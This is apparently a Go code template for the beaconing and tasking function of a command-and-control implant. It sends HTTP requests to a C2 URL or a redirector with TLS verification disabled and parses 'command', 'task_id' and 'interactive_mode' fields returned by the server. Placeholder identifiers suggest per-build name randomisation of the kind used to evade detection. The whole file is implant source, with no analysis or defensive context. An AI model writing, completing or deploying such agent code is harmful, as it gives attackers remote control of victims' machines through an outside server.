func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data interface{}) (*{API_RESPONSE_STRUCT_NAME}, error) {
	uri := strings.Replace(uriTemplate, "{agent_id}", a.{AGENT_ID_FIELD}, -1)

	var url string
	if a.{AGENT_USE_REDIRECTOR_FIELD} {
		protocol := "http"
		if strings.HasPrefix(a.{AGENT_CURRENT_C2_URL_FIELD}, "https") {
			protocol = "https"
		}
		url = fmt.Sprintf("%s://%s:%d%s", protocol, a.{AGENT_REDIRECTOR_HOST_FIELD}, a.{AGENT_REDIRECTOR_PORT_FIELD}, uri)
	} else {
		url = a.{AGENT_CURRENT_C2_URL_FIELD} + uri
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: false,  // Keep connections alive for efficiency
		MaxIdleConns: 10,
		IdleConnTimeout: 90 * time.Second,
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

	var req *http.Request
	var err error

	if data != nil {
		jsonData, err := json.Marshal(data)
		if err != nil {
			return nil, err
		}
		req, err = http.NewRequest(method, url, bytes.NewBuffer(jsonData))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/json")
	} else {
		req, err = http.NewRequest(method, url, nil)
		if err != nil {
			return nil, err
		}
	}

	for key, value := range a.{AGENT_HEADERS_FIELD} {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
	}

	// Try to unmarshal with flexible handling for task_id field
	var apiResp {API_RESPONSE_STRUCT_NAME}
	err = json.Unmarshal(body, &apiResp)
	if err != nil {
		// If unmarshaling fails due to task_id type mismatch, try a more flexible approach
		// Try to unmarshal into a generic map first to handle mixed types
		var genericResp map[string]interface{}
		err2 := json.Unmarshal(body, &genericResp)
		if err2 != nil {
			return nil, err
		}

		// Manually populate the struct fields
		apiResp.Status = getStringValue(genericResp["status"])
		apiResp.InteractiveMode = getBoolValue(genericResp["interactive_mode"])
		apiResp.Command = getStringValue(genericResp["command"])
		apiResp.TaskID = genericResp["task_id"] // Keep as interface{} to handle both string and number

		// Handle tasks array if present
		if tasksData, ok := genericResp["tasks"]; ok {
			// For now, we'll just note that tasks exist - detailed parsing would require more complex handling
			if _, isArray := tasksData.([]interface{}); isArray {
			}
		}
	}

	return &apiResp, nil
}

// Helper functions to handle flexible type conversion
func getStringValue(value interface{}) string {
	if value == nil {
		return ""
	}
	switch v := value.(type) {
	case string:
		return v
	case float64: // JSON numbers are unmarshaled as float64
		// If it's a whole number, return as integer string
		if v == float64(int64(v)) {
			return fmt.Sprintf("%.0f", v)
		}
		return fmt.Sprintf("%g", v) // Use %g to avoid trailing zeros
	case int64:
		return fmt.Sprintf("%d", v)
	case int:
		return fmt.Sprintf("%d", v)
	case bool:
		return fmt.Sprintf("%t", v)
	default:
		return fmt.Sprintf("%v", v)
	}
}

func getBoolValue(value interface{}) bool {
	if value == nil {
		return false
	}
	switch v := value.(type) {
	case bool:
		return v
	case string:
		b, _ := strconv.ParseBool(v)
		return b
	case float64:
		return v != 0
	case int64:
		return v != 0
	case int:
		return v != 0
	default:
		return false
	}
}